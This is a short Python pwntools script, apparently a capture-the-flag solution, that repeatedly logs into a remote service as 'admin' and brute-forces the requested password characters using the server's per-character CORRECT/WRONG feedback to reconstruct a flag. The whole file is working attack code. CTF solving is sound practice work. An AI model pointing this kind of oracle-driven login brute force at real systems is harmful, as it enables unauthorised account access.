from pwn import *
import string
import re

characters = string.ascii_lowercase + '_{}'
d = {}
#d = {'11': 0, '30': 15, '10': 8, '13': 25, '36': 25, '12': 11, '17': 18, '15': 0, '14': 15, '24': 20, '25': 25, '26': 25, '27': 11, '20': 17, '21': 3, '22': 25, '23': 15, '33': 2, '32': 4, '31': 8, '16': 18, '28': 4, '29': 17, '35': 18, '34': 4, '1': 5, '19': 14, '3': 0, '2': 11, '5': 22, '4': 6, '7': 0, '6': 15, '9': 11, '8': 17, '18': 20}
p = remote('jh2i.com', 50026)
while True:
	p.recvuntil('>')
	p.sendline('2')
	p.recvuntil('Username:')
	p.sendline('admin')
	s = p.recvuntil('Password:')
	pattern = r'(\d.*, \d.*, and \d.*)'
	m = re.findall(pattern, s)
	l = re.split(',| ', m[0])
	nums = [l[0], l[2], l[5]]
	payload = ''
	for num in nums:
		if num not in d.keys():
			d[num] = 0
		payload += characters[d[num]] + ' '

	print(payload)
	p.sendline(payload)
	s1 = p.recvuntil('\n')
	s2 = p.recvuntil('\n')
	s3 = p.recvuntil('\n')
	print(s1, s2, s3)
	if 'CORRECT' in s1 and 'CORRECT' in s2 and 'CORRECT' in s3:
		p.recvuntil('>')
		print(d)
		s = ''
		for i in range(1, len(d) + 1):
			s += characters[d[str(i)]]
		print("Temporary Flag: {}".format(s))
		# Logout
		p.sendline('3')
	else:
		if 'WRONG' in s1:
			d[nums[0]] += 1
		if 'WRONG' in s2:
			d[nums[1]] += 1
		if 'WRONG' in s3:
			d[nums[2]] += 1

p.close()